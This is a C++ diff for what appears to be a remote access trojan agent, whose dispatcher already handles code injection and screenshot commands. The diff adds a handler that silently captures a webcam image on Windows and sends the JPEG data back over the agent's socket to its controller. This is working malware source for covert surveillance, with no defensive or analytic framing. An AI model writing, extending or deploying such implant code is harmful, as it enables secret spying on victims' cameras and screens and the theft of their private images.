@@ -4,6 +4,7 @@
 #include "../include/MachInjector.hpp"
 #ifdef _WIN32
 #include "../include/ScreenCapture.hpp"
+#include "../include/CameraCapture.hpp"
 #endif
 #include <iostream>
 #include <cstdio>
@@ -326,7 +327,14 @@ void Agent::handleDispatching(Packet&& packet) {
     } else if (opcode == static_cast<uint16_t>(Opcode::INJECT)) {
         handleInjection(std::move(packet));
     } else if (opcode == static_cast<uint16_t>(Opcode::SCREENSHOT_REQ)) {
-        handleScreenshot();
+        const auto& raw = packet.getPayload();
+        if (raw.empty() || raw[0] == 1) {
+            handleScreenshot();
+        } else if (raw[0] == 2) {
+            handleCameraCapture();
+        } else {
+            handleScreenshot();
+        }
     }
 }
 
@@ -493,6 +501,49 @@ void Agent::handleScreenshot() {
                std::string(payload.begin(), payload.end()));
     m_socket.sendData(res.serialize());
     std::fprintf(stderr, "[Agent] Screenshot not supported on this platform\n");
+#endif
+}
+
+void Agent::handleCameraCapture() {
+#ifdef _WIN32
+    inferno::capture::CameraResult result = inferno::capture::captureCamera();
+    if (!result.success && !result.error_msg.empty()) {
+        std::fprintf(stderr, "[Agent] Camera capture failed: %s\n",
+                     result.error_msg.c_str());
+    }
+    std::vector<uint8_t> payload;
+    uint16_t status = result.success ? 0 : 1;
+    payload.push_back(static_cast<uint8_t>((status >> 8) & 0xFF));
+    payload.push_back(static_cast<uint8_t>(status & 0xFF));
+    uint32_t w = result.width;
+    payload.push_back(static_cast<uint8_t>((w >> 24) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((w >> 16) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((w >> 8) & 0xFF));
+    payload.push_back(static_cast<uint8_t>(w & 0xFF));
+    uint32_t h = result.height;
+    payload.push_back(static_cast<uint8_t>((h >> 24) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((h >> 16) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((h >> 8) & 0xFF));
+    payload.push_back(static_cast<uint8_t>(h & 0xFF));
+    uint32_t sz = static_cast<uint32_t>(result.jpeg_data.size());
+    payload.push_back(static_cast<uint8_t>((sz >> 24) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((sz >> 16) & 0xFF));
+    payload.push_back(static_cast<uint8_t>((sz >> 8) & 0xFF));
+    payload.push_back(static_cast<uint8_t>(sz & 0xFF));
+    payload.insert(payload.end(), result.jpeg_data.begin(), result.jpeg_data.end());
+
+    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+               std::string(payload.begin(), payload.end()));
+    m_socket.sendData(res.serialize());
+    std::cout << "[Agent] Camera captured (" << w << "x" << h
+              << ", " << sz << " bytes)" << std::endl;
+#else
+    std::vector<uint8_t> payload(14, 0);
+    payload[1] = 1;
+    Packet res(static_cast<uint16_t>(Opcode::SCREENSHOT_RES),
+               std::string(payload.begin(), payload.end()));
+    m_socket.sendData(res.serialize());
+    std::fprintf(stderr, "[Agent] Camera not supported on this platform\n");
 #endif
 }
 
